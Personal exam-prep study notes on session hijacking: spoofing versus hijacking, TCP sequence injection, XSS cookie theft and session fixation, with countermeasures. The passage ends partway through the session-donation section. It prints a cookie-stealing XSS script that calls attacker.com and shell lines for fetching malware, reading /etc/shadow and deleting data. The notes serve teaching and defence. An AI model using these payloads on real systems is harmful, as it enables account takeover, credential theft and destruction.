# Session 16B — Spoofing vs Hijacking · Session Hijacking Types · Steps · Prevention 🎭

> Personal study notes | Ethical Hacking Module | CCEE Prep

---

## 📑 Table of Contents

- [🗺️ Where This Session Fits](#️-where-this-session-fits)
- [⚠️ Exam Traps & Misconceptions](#️-exam-traps--misconceptions)
- [🧱 Foundation Knowledge](#-foundation-knowledge)
- [Section 1 — Spoofing vs Hijacking](#section-1--spoofing-vs-hijacking)
  - [1.1 What Is Spoofing](#11-what-is-spoofing)
  - [1.2 What Is Hijacking](#12-what-is-hijacking)
  - [1.3 Spoofing vs Hijacking — Full Comparison](#13-spoofing-vs-hijacking--full-comparison)
  - [1.4 Types of Spoofing](#14-types-of-spoofing)
- [Section 2 — Session Hijacking Fundamentals](#section-2--session-hijacking-fundamentals)
  - [2.1 What Is Session Hijacking](#21-what-is-session-hijacking)
  - [2.2 Why Sessions Are Vulnerable](#22-why-sessions-are-vulnerable)
  - [2.3 Session Tokens — The Target](#23-session-tokens--the-target)
- [Section 3 — Types of Session Hijacking](#section-3--types-of-session-hijacking)
  - [3.1 Active Session Hijacking](#31-active-session-hijacking)
  - [3.2 Passive Session Hijacking](#32-passive-session-hijacking)
  - [3.3 Network-Level Session Hijacking](#33-network-level-session-hijacking)
  - [3.4 Application-Level Session Hijacking](#34-application-level-session-hijacking)
  - [3.5 Active vs Passive — Full Comparison](#35-active-vs-passive--full-comparison)
- [Section 4 — Steps to Perform Session Hijacking](#section-4--steps-to-perform-session-hijacking)
  - [4.1 Phase 1 — Sniff the Traffic](#41-phase-1--sniff-the-traffic)
  - [4.2 Phase 2 — Monitor the Session](#42-phase-2--monitor-the-session)
  - [4.3 Phase 3 — Predict the Session Token](#43-phase-3--predict-the-session-token)
  - [4.4 Phase 4 — Take Over the Session](#44-phase-4--take-over-the-session)
  - [4.5 Phase 5 — Inject Malicious Commands](#45-phase-5--inject-malicious-commands)
- [Section 5 — TCP Session Hijacking](#section-5--tcp-session-hijacking)
  - [5.1 TCP Sequence Numbers — Foundation](#51-tcp-sequence-numbers--foundation)
  - [5.2 TCP Session Hijacking Mechanism](#52-tcp-session-hijacking-mechanism)
  - [5.3 Desynchronization](#53-desynchronization)
  - [5.4 ACK Storm](#54-ack-storm)
- [Section 6 — Application-Level Session Hijacking Techniques](#section-6--application-level-session-hijacking-techniques)
  - [6.1 Session Token Theft — Cookie Stealing](#61-session-token-theft--cookie-stealing)
  - [6.2 Cross-Site Scripting (XSS) for Session Hijacking](#62-cross-site-scripting-xss-for-session-hijacking)
  - [6.3 Session Fixation](#63-session-fixation)
  - [6.4 Session Donation](#64-session-donation)
  - [6.5 Cross-Site Request Forgery (CSRF)](#65-cross-site-request-forgery-csrf)
  - [6.6 Man-in-the-Browser (MitB)](#66-man-in-the-browser-mitb)
- [Section 7 — Prevention of Session Hijacking](#section-7--prevention-of-session-hijacking)
  - [7.1 Encryption-Based Prevention](#71-encryption-based-prevention)
  - [7.2 Token Security Measures](#72-token-security-measures)
  - [7.3 Server-Side Controls](#73-server-side-controls)
  - [7.4 Network-Level Prevention](#74-network-level-prevention)
  - [7.5 Application Framework Controls](#75-application-framework-controls)
- [📌 Extra Notes](#-extra-notes)
  - [E1 — TCP Sequence Number Prediction — Deep Dive](#e1--tcp-sequence-number-prediction--deep-dive)
  - [E2 — HTTP Cookie Attributes — Security Reference](#e2--http-cookie-attributes--security-reference)
  - [E3 — Session Hijacking Tools](#e3--session-hijacking-tools)
  - [E4 — Firesheep — Historical Context](#e4--firesheep--historical-context)
  - [E5 — Session Hijacking vs MITM vs Sniffing](#e5--session-hijacking-vs-mitm-vs-sniffing)
  - [E6 — OAuth Token Hijacking](#e6--oauth-token-hijacking)
  - [E7 — Predecessor / Successor Chains](#e7--predecessor--successor-chains)
  - [E8 — Terminology Traps](#e8--terminology-traps)
  - [E9 — Current Landscape 2026](#e9--current-landscape-2026)
  - [E10 — Indian Legal Context](#e10--indian-legal-context)
- [Abbreviations Table](#abbreviations-table)
- [🔑 Keywords + Concept Map](#-keywords--concept-map)
- [⚡ Quick Reference Cheatsheet](#-quick-reference-cheatsheet)
- [✅ Session Revision Snapshot](#-session-revision-snapshot)
- [Next Session Bridge](#next-session-bridge)
- [📖 Glossary](#-glossary)

---

## 🗺️ Where This Session Fits

    Module 05 — Security Concepts
    └── Part B — Ethical Hacking (Sessions 6–20)
        ├── Sessions 6–9    : Concepts, Principles, Hacker Classes
        ├── Sessions 10–11  : Recon, Scanning, Enumeration, Passwords
        ├── Session 12A     : Password Countermeasures · Keyloggers
        ├── Session 12B     : Trojans · Backdoors · Reverse Shells
        ├── Session 13      : Trojan Construction · Wrapping · Evasion
        ├── Session 14      : Viruses · Worms · AV Evasion
        ├── Session 15      : Sniffing · ARP Poisoning · DNS Attacks
        ├── Session 16A     : DoS Types · DDoS · BOTs/BOTNETs · Smurf · SYN Flood
        ├── ▶ SESSION 16B   : Spoofing vs Hijacking · Session Hijacking Types
        │                     Steps to Hijack · Prevention
        │                                          ← YOU ARE HERE
        └── Sessions 17–20  : Web Attacks · Wireless · IDS · Physical · Malware RE

**Phase position:** Session 16B completes the Session 16 block by
moving from disruption (DoS/DDoS) to **active session takeover**.
Where 16A attacked availability by overwhelming systems, 16B attacks
**authenticity** — stealing or taking over an already-authenticated
session so the attacker can impersonate a legitimate user without
ever needing their credentials.

The sniffing knowledge from Session 15 (how traffic is captured),
the ARP poisoning knowledge (how MITM is established), and the TCP
knowledge from 16A (sequence numbers, handshake) all converge here.
Session hijacking is the culmination of those earlier techniques.

---

## ⚠️ Exam Traps & Misconceptions

| ❌ Misconception | ✅ Reality |
|---|---|
| Spoofing and hijacking are the same attack | Spoofing FAKES an identity for a NEW transaction without an established session. Hijacking TAKES OVER an EXISTING authenticated session that is already in progress. |
| Session hijacking requires breaking encryption | Session hijacking targets SESSION TOKENS — not the encryption. If the token is stolen, the attacker uses it directly — no encryption breaking required. |
| Active hijacking is always better than passive | Active hijacking takes over the session — but is NOISY and detectable. Passive hijacking silently monitors — less capability but much harder to detect. |
| Session fixation gives the attacker a valid session token | Session fixation gives the attacker a session ID they SET BEFORE the victim logs in. After the victim authenticates with that ID, the attacker uses the SAME ID — now authenticated. The attacker does not steal a token — they PLANTED it. |
| CSRF is the same as XSS-based session hijacking | CSRF forges requests FROM the victim's browser — abusing their authenticated session — without stealing the token. XSS steals the session token itself. Completely different mechanisms. |
| TCP sequence number prediction was the primary method | TCP sequence number randomization (RFC 6528) made prediction attacks almost impossible on modern stacks. Modern session hijacking primarily targets APPLICATION-LAYER session tokens (cookies, JWT) — not TCP sequence numbers. |
| Session hijacking only works on HTTP | Session hijacking works on any protocol using session tokens — HTTP cookies, OAuth tokens, API keys, database sessions, SSH sessions (via different mechanisms). |
| HTTPOnly cookies completely prevent session hijacking | HTTPOnly prevents JavaScript from reading cookies — blocking XSS-based theft. Cookies can STILL be stolen via network sniffing if transmitted over HTTP, or via MITM even on HTTPS if certificate validation fails. |
| Logging out always invalidates a hijacked session | If the attacker stole the session token BEFORE logout, they can continue using it until the SERVER invalidates it. Client-side logout (clearing local cookie) does not revoke a server-side stolen token. |
| Session hijacking and session fixation are the same | Session hijacking STEALS an existing valid token AFTER login. Session fixation FORCES a known token BEFORE login — waiting for victim to authenticate with it. |

---

## 🧱 Foundation Knowledge

<details>
<summary>Click to expand — Must-know before this session</summary>

**HTTP is Stateless — Why Sessions Exist**

HTTP protocol is stateless — each request is independent with no
memory of previous requests. To maintain state (login, shopping cart,
preferences), web applications issue session tokens after
authentication — a unique identifier that the client sends with
every subsequent request to prove it is the same authenticated user.

    User logs in with username + password
            ↓
    Server verifies credentials → creates session in database
    Server sends: Set-Cookie: SESSIONID=abc123xyz; Path=/; HttpOnly
            ↓
    Browser stores cookie
            ↓
    Every subsequent request includes:
    Cookie: SESSIONID=abc123xyz
            ↓
    Server looks up abc123xyz in session store → knows who user is
    → Returns personalized, authenticated response

If an attacker obtains `abc123xyz` — they can make requests as
that user without ever knowing the password.

**TCP Sequence Numbers — Recap from 16A**

    Each TCP connection has two sequence number streams:
    Client → Server: Client ISN (Initial Sequence Number) + data bytes sent
    Server → Client: Server ISN + data bytes sent

    ACK number = last received sequence number + 1
    (acknowledges receipt up to that byte)

    For TCP session hijacking:
    Attacker needs to send packets with CORRECT sequence numbers
    or the server discards them as out-of-window

**Cookie Attributes — Security Relevant**

| Attribute | Purpose |
|---|---|
| `Secure` | Cookie only sent over HTTPS — never HTTP |
| `HttpOnly` | JavaScript cannot access cookie — blocks XSS theft |
| `SameSite=Strict` | Cookie not sent in cross-site requests — blocks CSRF |
| `SameSite=Lax` | Cookie sent in same-site and top-level navigation |
| `SameSite=None` | Cookie sent in all contexts — requires Secure |
| `Domain` | Which domains receive the cookie |
| `Path` | Which paths receive the cookie |
| `Expires/Max-Age` | Cookie lifetime |

**MITRE ATT&CK Reference**

- T1539 — Steal Web Session Cookie
- T1185 — Browser Session Hijacking
- T1134 — Access Token Manipulation
- T1563 — Remote Service Session Hijacking
- T1557 — Adversary-in-the-Middle
- T1059.007 — JavaScript (XSS for cookie theft)

</details>

---

## Section 1 — Spoofing vs Hijacking

### 1.1 What Is Spoofing

**WHAT:**
Spoofing is the act of **falsifying identity information** to deceive
a system or user — making a packet, message, or connection appear
to originate from a trusted, legitimate source when it actually
comes from the attacker.

**Key characteristics:**
- Does NOT require an existing session to be in progress
- Creates a FALSE identity for a new transaction
- The victim (or target system) has not authenticated yet
- Attacker pretends to BE someone else

**Analogy:**
Spoofing is like forging a letter with someone else's signature and
letterhead — you create a fake document that appears to come from
a trusted sender. No ongoing conversation is being interrupted —
you are simply fabricating a false identity from scratch.

**Common spoofing types:**

| Type | What Is Faked | Layer |
|---|---|---|
| **IP Spoofing** | Source IP address in packet header | Layer 3 |
| **MAC Spoofing** | Source MAC address in Ethernet frame | Layer 2 |
| **ARP Spoofing** | IP→MAC mapping in ARP reply | Layer 2.5 |
| **DNS Spoofing** | DNS response records | Layer 7 |
| **Email Spoofing** | From address in email header | Layer 7 |
| **Caller ID Spoofing** | Calling phone number display | Telephony |
| **Website Spoofing** | Fake website mimicking legitimate one | Layer 7 |
| **GPS Spoofing** | Fake GPS coordinates | Physical |

---

### 1.2 What Is Hijacking

**WHAT:**
Hijacking is the act of **taking control of an existing, already-
authenticated session** — stealing or predicting the session
identifier to impersonate a legitimate user who has already
proven their identity to the target system.

**Key characteristics:**
- REQUIRES an existing authenticated session in progress
- The victim has already logged in — authentication is complete
- Attacker steals the SESSION TOKEN (proof of authentication)
- Attacker impersonates the authenticated user going forward
- The victim's session is disrupted or the attacker runs parallel

**Analogy:**
Hijacking is like intercepting a taxi already carrying a passenger
to their destination — jumping in and redirecting the taxi while
the original passenger is pushed out. The taxi driver (server) may
not immediately notice the passenger changed. The original
passenger (victim) has already proven they belong in the taxi
(logged in) — the hijacker exploits this established trust.

---

### 1.3 Spoofing vs Hijacking — Full Comparison

| Property | Spoofing | Session Hijacking |
|---|---|---|
| **Existing session required?** | ❌ No | ✅ Yes — must be in progress |
| **Authentication bypassed?** | ✅ Yes — fakes identity | ✅ Yes — steals proof of authentication |
| **What is taken?** | Identity (IP, MAC, email address) | Session token (cookie, token, seq no.) |
| **Victim interaction needed?** | Often no | Usually yes — victim must have logged in |
| **Real-time attack?** | Not always | Often yes (active hijacking) |
| **Target** | The deceived system | The authenticated session |
| **Example** | IP spoofing in SYN flood | Cookie theft via XSS |
| **Countermeasure** | Ingress filtering, DNSSEC | HTTPS, HttpOnly, short session timeout |

> [!IMPORTANT]
> The single most tested distinction:
> **Spoofing = fake identity, no prior session needed**
> **Hijacking = steal an existing authenticated session**
> Spoofing can ENABLE hijacking (ARP spoofing enables MITM →
> enables session token theft) but they are distinct concepts.

---

### 1.4 Types of Spoofing

**IP Spoofing:**
Attacker sets the source IP field in an IP packet to a fake address.
Used in: SYN floods, Smurf attacks, DNS amplification.
No response is received by the attacker (traffic goes to spoofed IP).

**Email Spoofing:**
Attacker sets the `From:` header in an email to a trusted address.
Recipients see the spoofed sender — may trust and act on the email.
Countermeasures: SPF, DKIM, DMARC records in DNS.

**Caller ID Spoofing (Vishing):**
VoIP allows arbitrary caller ID. Attacker calls victim appearing
to be a bank, government agency, or internal IT.
Used in: Social engineering, vishing attacks.

**Website Spoofing (Pharming):**
Fake website with identical appearance to legitimate site.
Combined with DNS spoofing or hosts file modification to
redirect victims. Harvests credentials entered by victims.

---

## Section 2 — Session Hijacking Fundamentals

### 2.1 What Is Session Hijacking

**WHAT:**
Session hijacking (also called cookie hijacking, cookie theft, or
session stealing) is an attack where the attacker **obtains a valid
session token** belonging to an authenticated user and uses it to
impersonate that user — gaining all the access rights and privileges
of the legitimate session owner without ever knowing their password.

**WHY it works:**
Web applications (and many other systems) use session tokens as a
substitute for re-sending credentials with every request. The session
token IS the proof of authentication. Whoever possesses the token
IS authenticated — from the server's perspective.

**Analogy:**
A session token is like a VIP wristband at a concert. Security
checks your ticket (credentials) at the entrance and gives you a
wristband (session token). Inside, staff check wristbands —
not tickets. If someone steals your wristband, they can go
anywhere you are permitted to go — without ever having a ticket.

**What attackers gain:**
- Access to authenticated user's account and data
- Ability to perform transactions as the victim
- Ability to change account settings (email, password)
- Access to all resources the victim is authorized to use
- In web applications: full account takeover without brute force

---

### 2.2 Why Sessions Are Vulnerable

| Vulnerability | Cause | Exploitation |
|---|---|---|
| **Cleartext transmission** | Session token sent over HTTP (not HTTPS) | Sniff token from network traffic |
| **Predictable tokens** | Weak random number generation | Predict next valid token |
| **No token expiry** | Long-lived or never-expiring tokens | Captured token valid indefinitely |
| **Client-side storage** | Token stored in accessible browser storage | XSS reads document.cookie |
| **No binding to client** | Token not tied to IP or user agent | Token works from any device |
| **Insecure transmission** | Token in URL query string | Server logs, browser history, Referer header |
| **No invalidation on logout** | Server does not invalidate token at logout | Stolen token still valid after victim logs out |
| **Session fixation** | Server accepts pre-set session IDs | Attacker plants ID before authentication |

---

### 2.3 Session Tokens — The Target

**What session tokens look like:**

HTTP Cookie (most common):

    Cookie: PHPSESSID=abc123def456ghi789; path=/

JWT (JSON Web Token):

    Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
    eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4iLCJpYXQiOjE1MTYyMzkwMjJ9.
    SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

URL-embedded token (insecure):

    https://example.com/account?sessionid=abc123def456

**Token quality determines exploitability:**

| Token Type | Bits of Entropy | Exploitability |
|---|---|---|
| Sequential integer (1, 2, 3...) | ~0 | Trivially predictable |
| Timestamp-based | ~32 bits | Predictable with timing |
| MD5(username+timestamp) | Low | Predictable with user info |
| UUID v4 | 122 bits | Effectively random |
| Cryptographically secure random | 128+ bits | Not feasibly predictable |

> [!WARNING]
> Session tokens in URL query strings are extremely dangerous.
> They appear in: server access logs, browser history,
> bookmarks, Referer headers sent to third parties, and
> proxy logs. A single visit to a page with external resources
> sends the session token in the Referer header to every
> third-party domain — exposing it to any analytics or
> advertising service on the page.

---

## Section 3 — Types of Session Hijacking

### 3.1 Active Session Hijacking

**WHAT:**
Active session hijacking involves the attacker **directly taking
control of an existing session** — sending packets that are part
of the victim's session, executing commands as the victim, or
completely displacing the victim from their own session.

**Characteristics:**
- Attacker actively sends data in the victim's session
- Victim experiences disruption (connection reset, erratic behaviour)
- Higher risk of detection — abnormal activity is visible
- Gives attacker direct command/action capability
- The victim's session is disrupted or terminated

**Example scenario:**

    Victim has authenticated SSH session to server
            ↓
    Attacker positions as MITM via ARP poisoning
            ↓
    Attacker captures TCP session parameters
    (sequence numbers, port numbers)
            ↓
    Attacker sends RST to victim → disconnects victim
            ↓
    Attacker continues session with correct sequence numbers
            ↓
    Server sees: same session parameters → same client
    Attacker now has full shell access

**Active hijacking methods:**
- TCP session hijacking (inject commands with correct seq numbers)
- Cookie injection (replace victim's cookie in MITM)
- Token substitution in intercepted requests

---

### 3.2 Passive Session Hijacking

**WHAT:**
Passive session hijacking involves the attacker **monitoring and
recording a session** without actively participating — collecting
all data exchanged between the client and server, including the
session token and all transmitted content.

**Characteristics:**
- Attacker silently observes traffic — does not send any data
- Victim experiences no disruption — session continues normally
- Very difficult to detect
- Attacker collects session token for LATER use
- Can collect credentials, data, and session tokens simultaneously

**Example scenario:**

    Victim logs into banking website over HTTP (not HTTPS)
            ↓
    Attacker on same network uses ARP poisoning + Wireshark
            ↓
    Attacker captures HTTP traffic passively
    Extracts: Cookie: SESSIONID=abc123xyz from HTTP headers
            ↓
    Victim completes their banking session normally
    Victim has no idea they were monitored
            ↓
    Attacker later opens browser → sets cookie abc123xyz
            ↓
    Attacker accesses victim's account using stolen valid token

---

### 3.3 Network-Level Session Hijacking

**WHAT:**
Network-level session hijacking targets **Layer 3/4 protocols** —
specifically TCP sessions — by exploiting TCP sequence numbers
to inject packets into an established connection.

**Targets:**
- TCP sessions (Telnet, FTP, rlogin, unencrypted HTTP)
- Any application running over TCP without encryption

**Techniques:**
- TCP sequence number prediction
- TCP ACK sequence number insertion
- RST injection (drop victim from session)
- MITM-based TCP injection

**Requires:**
- Network-level access (same segment or MITM position)
- Knowledge of TCP sequence/acknowledgement numbers
- IP spoofing capability or MITM position

**Tools:** Juggernaut, Hunt, TTY Watcher, T-Sight

---

### 3.4 Application-Level Session Hijacking

**WHAT:**
Application-level session hijacking targets **application-layer
session tokens** (HTTP cookies, OAuth tokens, JWT, API keys)
rather than TCP-level sequence numbers.

**Why it dominates modern attacks:**
TCP sequence number randomization (per RFC 6528) makes TCP-level
hijacking extremely difficult. However, application-level session
tokens — if not properly secured — can be stolen through multiple
vectors that do not require TCP-level access.

**Techniques:**
- Cookie theft via XSS (Cross-Site Scripting)
- Cookie sniffing over HTTP
- Session fixation
- Session donation
- CSRF (Cross-Site Request Forgery)
- Man-in-the-Browser
- Predictable token exploitation
- Token in URL (Referer leakage)

**Requires:**
- No special network access for most techniques
- Web application vulnerability (XSS, CSRF)
- Or network access for sniffing

---

### 3.5 Active vs Passive — Full Comparison

| Property | Active Hijacking | Passive Hijacking |
|---|---|---|
| **Attacker sends packets?** | ✅ Yes — participates | ❌ No — only observes |
| **Victim disrupted?** | ✅ Yes — often disconnected | ❌ No — session continues normally |
| **Detectability** | Higher — generates anomalies | Very low — no traffic generated |
| **Attack timing** | Real-time — must act during session | Can capture token and use later |
| **What attacker gets** | Direct session control | Session token + all transmitted data |
| **Technical complexity** | High — sequence numbers required | Lower — just capture + replay |
| **Example** | TCP seq number injection | Cookie sniffing over HTTP |

---

## Section 4 — Steps to Perform Session Hijacking

### 4.1 Phase 1 — Sniff the Traffic

    OBJECTIVE: Position to capture traffic between client and server

    METHOD 1 — Local Network (passive sniffing):
      Place NIC in promiscuous mode
      Capture all traffic on hub network
      Wireshark filter: http or ftp or telnet

    METHOD 2 — Switched Network (active sniffing):
      Perform ARP poisoning on victim + gateway
      Enable IP forwarding to maintain connectivity
      All victim traffic now flows through attacker
      Wireshark captures it transparently

    METHOD 3 — XSS injection (no network access needed):
      Inject JavaScript into vulnerable web application
      Script executes in victim's browser
      Exfiltrates document.cookie to attacker's server

    TOOLS: Wireshark, tcpdump, arpspoof, Ettercap, Bettercap

---

### 4.2 Phase 2 — Monitor the Session

    OBJECTIVE: Identify the session token and session parameters

    WHAT TO MONITOR:
      HTTP headers → Cookie: SESSIONID=value
      HTTP POST bodies → username/password fields
      TCP sequence and acknowledgement numbers
      Session lifetime and token format

    WIRESHARK DISPLAY FILTERS:
      http.cookie            → show all HTTP cookies
      http contains "SESSID" → find session cookies
      http.request           → all HTTP requests
      tcp.stream eq 5        → follow specific TCP stream

    OUTCOME:
      Attacker has: session token, target URL, TCP seq numbers
      Attacker understands: session format, request patterns

---

### 4.3 Phase 3 — Predict the Session Token

    OBJECTIVE: If token cannot be sniffed, attempt to predict it

    APPROACH 1 — Entropy analysis:
      Collect multiple session tokens
      Analyze for patterns: timestamp-based, sequential,
      hash of known values
      Statistical analysis of token distribution

    APPROACH 2 — Brute force (low-entropy tokens):
      If token is 4-character alphanumeric: 36^4 = 1,679,616 options
      Automated request with each candidate token
      Check server response for authenticated vs unauthenticated

    APPROACH 3 — Session fixation:
      Skip prediction — plant a known token before victim logs in
      Wait for victim to authenticate with planted token
      Use same known token (now authenticated) to access account

    MODERN REALITY:
      Strong tokens (UUID v4, 128-bit cryptographic random) are
      not feasibly predictable. Modern attacks focus on THEFT
      not prediction. Prediction attacks only work against
      poorly implemented applications.

---

### 4.4 Phase 4 — Take Over the Session

    OBJECTIVE: Use stolen/predicted token to access authenticated session

    ACTIVE TAKEOVER:
      OPTION 1 — Cookie injection via browser:
        Open browser Developer Tools → Application → Cookies
        Replace cookie value with stolen token
        Reload authenticated page → server accepts

      OPTION 2 — TCP injection (network-level):
        Send TCP packet with correct seq/ack numbers
        Source IP = victim IP (via MITM or spoofing)
        Inject command → server executes in victim's session

      OPTION 3 — HTTP replay:
        Craft HTTP request with stolen Cookie header
        Send to server → authenticated response returned

    PASSIVE USE:
      Use Burp Suite or curl with stolen cookie
      curl -b "SESSIONID=abc123xyz" https://target.com/account

    DISCONNECT VICTIM (active attack):
      Send RST packet to victim's TCP connection
      Victim connection drops → attacker takes over
      Server still has session open → attacker connects with token

---

### 4.5 Phase 5 — Inject Malicious Commands

    OBJECTIVE: Execute actions as the authenticated victim

    WEB APPLICATION:
      Transfer funds from victim's banking account
      Change account email/password → lock out victim
      Download sensitive documents
      Place fraudulent orders
      Delete or modify data

    NETWORK SESSION (Telnet/SSH via TCP hijacking):
      Execute shell commands as victim's user
      cat /etc/passwd → extract credentials
      wget http://attacker.com/malware → install backdoor
      rm -rf /important/data → destruction

    COMMAND INJECTION IN TCP SESSION:
      Attacker sends: "cat /etc/passwd\n" with correct seq numbers
      Server executes command in victim's authenticated shell
      Server sends output back → attacker captures it

---

## Section 5 — TCP Session Hijacking

### 5.1 TCP Sequence Numbers — Foundation

Every TCP connection uses sequence numbers to track byte position
in the data stream. These numbers are critical for TCP session
hijacking at the network level.

    Client ISN: x  (set during SYN)
    Server ISN: y  (set during SYN-ACK)

    After connection established:
      Client sends n bytes → Client seq becomes x + n
      Client expects ACK: y + 1 initially

    For attacker to inject into this stream:
      Must send packet with:
        Source IP = victim IP
        Source Port = victim port
        Sequence number = x + n (next expected by server)
        ACK number = y + (data received)

    If sequence number is WRONG:
      Server discards packet (out of window)
      No injection possible

**Why sequence numbers matter for hijacking:**
Getting the sequence number wrong by even 1 byte means the
server silently discards the injected packet — the attack fails.

---

### 5.2 TCP Session Hijacking Mechanism

**Scenario:** Victim has authenticated Telnet session to server.

    SETUP:
      Victim:   192.168.1.10:54321  →  Server: 192.168.1.1:23
      Attacker: 192.168.1.100 (in MITM position via ARP poisoning)

    STEP 1 — Attacker monitors session:
      Captures all TCP packets between victim and server
      Records: victim seq number, server seq number
      Watches victim type commands
      seq_client = 1000, seq_server = 5000 (example values)

    STEP 2 — Attacker constructs injected packet:
      Source IP:   192.168.1.10  (VICTIM'S IP — spoofed or via MITM)
      Source Port: 54321
      Dest IP:     192.168.1.1
      Dest Port:   23
      Seq Number:  1000 (current client sequence)
      ACK Number:  5000
      Data:        "cat /etc/shadow\n"

    STEP 3 — Attacker sends packet:
      Server receives packet
      Sequence number correct → server accepts
      Server executes: cat /etc/shadow
      Server sends output to 192.168.1.10 (victim's IP)

    STEP 4 — Attacker captures response:
      (In MITM position — attacker sees all traffic)
      Attacker reads /etc/shadow output

    STEP 5 — Desynchronization occurs:
      Victim sends their own packet (seq = 1000 — same as attacker)
      Server has already moved to 1000 + len(injected data)
      Victim's packet has WRONG sequence number → server sends ACK
      Victim receives unexpected ACK → sends their own ACK
      → ACK storm begins

---

### 5.3 Desynchronization

**WHAT:**
Desynchronization is the state where the client and server have
different views of the TCP sequence number — caused by the attacker
injecting data that the server accepts but the client never sent.

    Before hijacking:
      Client expects: server seq = 5000
      Server expects: client seq = 1000
      SYNCHRONIZED

    After attacker injects 20 bytes (seq 1000):
      Server now expects: client seq = 1020
      Client still thinks: server expects = 1000
      Client sends next packet with seq = 1000
      Server: "Expected 1020, got 1000" → out of window → IGNORED
      DESYNCHRONIZED

**Types of desynchronization:**

| Type | Cause | Effect |
|---|---|---|
| **Pre-data desynchronization** | Attacker sends extra data before connection is active | Seq numbers offset from start |
| **Post-data desynchronization** | Attacker injects during active data transfer | Seq numbers diverge mid-session |
| **RST + reconnect** | Attacker RSTs victim → victim reconnects | New seq numbers — harder to hijack |

---

### 5.4 ACK Storm

**WHAT:**
An ACK storm is a side effect of TCP session hijacking — a rapid,
self-reinforcing loop of ACK packets between victim and server —
caused by desynchronization. The storm is visible on the network
and indicates a hijacking attempt is in progress.

**Mechanism:**

    Server sends data with seq=5020 to victim (192.168.1.10)
            ↓
    Victim receives it — but expected seq=5000 → sends ACK for 5000
            ↓
    Server receives ACK for 5000 — expected ACK for 5020
    Server retransmits data from seq=5000
            ↓
    Victim still expects 5000 → sends ACK for 5000 again
            ↓
    Loop continues → ACK storm
    Each side keeps sending ACKs that confuse the other

**Detection value:**
An ACK storm generates a noticeable spike of ACK packets between
two hosts with no data payload — visible in Wireshark as a burst
of TCP ACK packets with the same or rapidly oscillating
acknowledgement numbers.

**Attacker mitigation:**
The attacker can suppress the ACK storm by sending RST to the
victim — dropping the victim's TCP connection entirely. Then the
attacker takes over the server-side session completely.

---

## Section 6 — Application-Level Session Hijacking Techniques

### 6.1 Session Token Theft — Cookie Stealing

**WHAT:**
The most direct approach — capturing the session cookie from
network traffic or browser storage and replaying it to the server.

**Via network sniffing (HTTP only):**

    Victim sends HTTP request (no HTTPS):
    GET /account HTTP/1.1
    Host: bank.example.com
    Cookie: SESSIONID=abc123xyz789

    Attacker in MITM position captures this header
    Extracts: SESSIONID=abc123xyz789
    Replays to server in their own browser
    → Authenticated as victim

**Prevention:** HTTPS (Secure flag on cookie) prevents sniffing.

**Via Wireshark:**

    Display filter: http.cookie
    Follow TCP Stream → see all cookie values in cleartext

---

### 6.2 Cross-Site Scripting (XSS) for Session Hijacking

**WHAT:**
XSS injects malicious JavaScript into a page viewed by the victim.
The script accesses `document.cookie` and sends the session cookie
to the attacker's server — without any network sniffing required.

**HOW:**

    STEP 1 — Attacker finds XSS vulnerability in target site:
      Vulnerable input: search box, comment field, profile name

    STEP 2 — Attacker injects malicious script:
      <script>
        var img = new Image();
        img.src = 'http://attacker.com/steal?c=' + document.cookie;
      </script>

    STEP 3 — Victim views page containing injected script:
      Script executes in victim's browser context
      Same-origin policy allows access to target site's cookies
      document.cookie = "SESSIONID=abc123xyz789"

    STEP 4 — Browser makes request to attacker's server:
      GET /steal?c=SESSIONID=abc123xyz789 HTTP/1.1
      Host: attacker.com

    STEP 5 — Attacker receives cookie in server log:
      Session token abc123xyz789 captured
      Attacker uses token → full account access

**Countermeasure:** `HttpOnly` flag prevents JavaScript from
reading cookies. `document.cookie` returns empty string for
HttpOnly cookies — XSS cannot steal them.

**Types of XSS:**

| Type | Persistence | Mechanism |
|---|---|---|
| **Reflected XSS** | ❌ Non-persistent | Malicious script in URL parameter — victim clicks crafted link |
| **Stored XSS** | ✅ Persistent | Script stored in database — executes for every visitor of page |
| **DOM XSS** | ❌ Non-persistent | Script modifies DOM via JavaScript without server interaction |

> [!IMPORTANT]
> **Stored XSS** is the most dangerous for session hijacking
> because the malicious script executes for EVERY user who
> views the infected page — not just victims who click a link.
> A stored XSS in a popular forum post can steal sessions from
> thousands of users automatically.

---

### 6.3 Session Fixation

**WHAT:**
Session fixation is an attack where the attacker **sets a known
session ID before the victim logs in** — then waits for the victim
to authenticate. After authentication, the server associates the
victim's identity with the KNOWN session ID — which the attacker
can now use.

**KEY DISTINCTION from session hijacking:**
- Session hijacking: attacker STEALS a valid token AFTER login
- Session fixation: attacker PLANTS a token BEFORE login, then
  the victim's successful login VALIDATES that planted token

**HOW — URL-based fixation:**

    STEP 1 — Attacker obtains any valid (unauthenticated) session ID
      from the target server:
      Attacker visits: https://bank.com/login
      Server responds: Set-Cookie: SESSIONID=ATTACKER_KNOWN_ID

    STEP 2 — Attacker sends victim a link with session ID embedded:
      https://bank.com/login?SESSIONID=ATTACKER_KNOWN_ID
      (or via email, phishing, injected page)

    STEP 3 — Victim clicks link — server sets cookie ATTACKER_KNOWN_ID
      Server associates session ATTACKER_KNOWN_ID with victim's browser

    STEP 4 — Victim enters credentials and logs in:
      Server authenticates victim
      Server associates ATTACKER_KNOWN_ID with victim's account
      (Server SHOULD create new session ID here — but vulnerable servers don't)

    STEP 5 — Attacker uses ATTACKER_KNOWN_ID:
      Attacker's browser already has ATTACKER_KNOWN_ID stored
      Attacker visits bank.com → server sees ATTACKER_KNOWN_ID → authenticated!
      Attacker has full account access

**Countermeasure:** Issue a brand new session ID immediately after
successful authentication — invalidate the pre-login session ID.

    // PHP secure session handling
    session_start();
    // After successful login:
    session_regenerate_id(true); // Creates new ID, deletes old one

---

### 6.4 Session Donation

**WHAT:**
Session donation is a variant of session fixation where the
attacker **donates their own authenticated session** to the victim
— tricking the victim into using the attacker's session, then
monitoring what the victim does with it (enters data, makes
purchases) which the attacker can see.

**WHY it's used:**
In scenarios where the attacker wants the victim to ENTER data
into an account the attacker controls — such as tricking a victim
into entering their credit card into the attacker's stored payment
profile on a shopping site.

**HOW:**

    Attacker logs in to shopping site → has authenticated session
    Attacker sends victim link with attacker's session ID
    Victim clicks → victim's browser uses attacker's session
    Victim enters credit card details → stored in ATTACKER'S account
    Attacker retrieves stored payment info

> [!NOTE]
> Session donation is less common in attack scenarios than
> session fixation but demonstrates the same fundamental
> vulnerability: servers that accept session IDs from parameters
